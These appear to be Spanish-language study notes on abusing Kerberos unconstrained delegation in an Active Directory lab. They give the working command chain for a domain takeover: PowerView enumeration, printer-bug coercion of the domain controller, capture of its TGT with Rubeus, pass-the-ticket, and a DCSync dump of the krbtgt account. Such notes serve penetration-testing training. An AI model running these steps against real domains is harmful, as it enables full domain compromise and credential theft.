La delegación sin restricciones permite a un servicio suplantar a un usuario en cualquier otro servicio del dominio.
Cuando esto esta habilitado el controlador de dominio incluye el *TGT (Ticket Granting Ticket)* en el *TGS (Ticket Granting Service)*. Entonces el *TGT* se extrae por el servicio y se almacena en *LSASS (Es un que se encarga de cumplir las políticas de seguridad y verificar los inicios de sesión)* lo que permite que se reutilice para su suplantación

## Flujo
- El usuario se autentica en el controlador de dominio y recibe el *TGT*
- El usuario solicita un *TGS* para un servicio
- El usuario envía tanto el *TGT* como el *TGS* al servicio
- El servicio extrae el *TGT* del usuario del usuario y solicita un nuevo *TGS* que acceda a otro recurso
- El servicio se autentica en el segundo servidor como usuario

Existen dos tipos de delegación kerberos
- General/Basic *Unconstrained Delegation*
- *Constrained Delegation*

# Uncostrained Delegation
## Enumeración
Para enumerar los equ8ipos que tienen *Unconstrained Delegation* con PowerView
```shell
Get-DomainComputer -UnConstrained
```

## Abuso

1. Comprometer un servidor donde esté habilitado *Unconstrained Delegation*.
2. Esperar o coaccionar a un administrador de dominio (o al DC) para que se autentique contra el servidor comprometido.
### Técnicas de coacción

Hay ciertos servicios de Windows que permiten a cualquier usuario autenticado obligar a una máquina a autenticarse contra otra:
- *MS-RPRN* (PrinterBug)
- *MS-EFSRPC* (PetitPotam)
- *MS-WSP*
- *MS-DFSNM*

3. En el servidor controlado por el atacante levantar un monitor para capturar TGTs:
```shell
Rubeus.exe monitor /interval:5 /nowrap
```
o:
```shell
Rubeus.exe harvest /interval:5
```

4. Forzar la autenticación del DC usando *MS-RPRN*.
El DC se autenticará contra el servidor comprometido y dejará su TGT en memoria (*LSASS*).
```shell
MS-RPRN.exe \\dcopr-dc.dollarcorp.moneycorp.local \\dcopr-appsrv.dollarcorp.moneycorp.local
```

5. Una vez capturado el TGT (codificado en base64), inyectarlo en memoria:
```shell
Rubeus.exe ptt /ticket:<base64_TGT>
```

6. Realizar DCSync:
```shell
safetykatz.exe "lsadump::dcsync /user:dcorp\krbtgt"
```
